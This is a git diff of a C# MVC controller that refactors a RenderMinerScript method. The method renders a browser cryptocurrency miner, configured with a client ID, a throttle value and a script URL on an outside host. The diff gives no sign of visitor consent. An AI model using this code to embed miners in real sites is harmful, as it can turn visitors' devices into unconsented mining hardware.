@@ -73,8 +73,23 @@ namespace SignalRService.Controllers
 
         }
 
-        [EnableCors(origins: "*", headers: "*", methods: "*")]
-        public MvcHtmlString RenderMinerScript()
+        //[EnableCors(origins: "*", headers: "*", methods: "*")]
+        //public MvcHtmlString RenderMinerScript()
+        //{
+        //    var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
+        //    {
+        //        ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
+        //        Throttle = "0.9",
+        //        ScriptUrl = "https://www.freecontent.date./W7KS.js",
+        //        StartDelayMs = 3000,
+        //        ReportStatusIntervalMs = 65000
+        //    };
+
+        //    var str = Utils.RenderUtils.RenderRazorViewToString(this, "RenderMiner", MinerConfigurationViewModel);
+        //    return new MvcHtmlString(str);
+        //}
+
+        public ActionResult RenderMinerScript()
         {
             var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
             {
@@ -85,9 +100,9 @@ namespace SignalRService.Controllers
                 ReportStatusIntervalMs = 65000
             };
 
-            var str = Utils.RenderUtils.RenderRazorViewToString(this, "RenderMiner", MinerConfigurationViewModel);
-            return new MvcHtmlString(str);
+            return PartialView("RenderMiner",MinerConfigurationViewModel);
         }
+
 
         //public PartialViewResult RenderSignalRBase(ViewModels.ServiceSettingViewModel basemodel)
         //{
@@ -95,7 +110,7 @@ namespace SignalRService.Controllers
         //    {
 
         //        SinalRGroup = basemodel.ServiceUrl
-                
+
         //    };
         //    return PartialView("RenderMiner", modelx);
         //}
